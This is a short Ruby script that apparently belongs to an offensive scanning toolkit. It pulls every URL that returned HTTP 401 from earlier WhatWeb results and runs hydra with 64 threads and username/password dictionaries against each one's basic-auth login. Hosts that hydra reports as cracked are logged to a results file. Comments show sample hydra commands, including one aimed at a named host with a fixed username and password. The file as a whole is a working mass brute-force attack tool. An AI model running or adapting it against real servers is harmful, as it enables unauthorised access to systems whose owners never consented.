#!/usr/bin/env ruby

#grep '"http_status":401' ../db/whatweb/* | awk -F '"' '{print $4}' > ../db/hydra/url.txt
#hydra -l damifan -p fanqieda "http-get://0zu.net:8000"
#hydra -t 64 -V -L ../db/dict/user.txt -P ../db/dict/pass.txt -M ../db/hydra/url.txt http-get
input = '../db/hydra/url.txt'
filter= ' | grep -v 1999'
cmd = "grep '\"http_status\":401' ../db/whatweb/* | awk -F '\"' '{print $4}' #{filter} > #{input}"
puts 'Running syscmd: '+cmd
result = `#{cmd}`

File.open(input).each do |line|
  line.chomp!
  line.gsub!('http://','')
  puts line

  cmd="hydra -t 64 -V -L ../db/dict/user.txt -P ../db/dict/pass.txt  http-get://#{line}"
  #cmd="hydra -t 64 -V -l damifan -p fanqiedan http-get://#{line}"
  puts 'Running syscmd: '+cmd
  result = `#{cmd}`
  if result and result.include? 'successfully'
    cmd="echo #{line} >> ../db/hydra/result.txt"
    puts 'Running syscmd: '+cmd
    `#{cmd}`
  end
  puts result
end

